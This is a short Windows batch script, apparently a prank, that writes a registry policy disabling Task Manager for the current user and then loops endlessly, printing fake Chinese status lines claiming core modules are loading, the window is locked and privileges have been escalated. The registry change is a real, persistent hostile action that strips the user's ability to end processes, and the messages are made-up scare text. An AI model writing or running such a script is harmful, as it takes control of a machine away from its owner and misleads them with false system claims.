@echo off
chcp 65001 >nul
title 爱坤
color 0a
mode con cols=240 lines=60
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>nul
:loop
echo [INFO] 正在加载核心模块 %random%%random%%random%%random%
echo [DEBUG] 分辨率检测完成：1920x1080
echo [EXPERT] 第 %random%%random%%random%%random% 行代码执行中
echo [SYSTEM] 窗口锁定成功 —— 爱坤专属界面
echo [LOAD] 数据加密校验 %random%%random%%random%%random%
echo [OK] 系统权限提升完成
echo.
goto loop
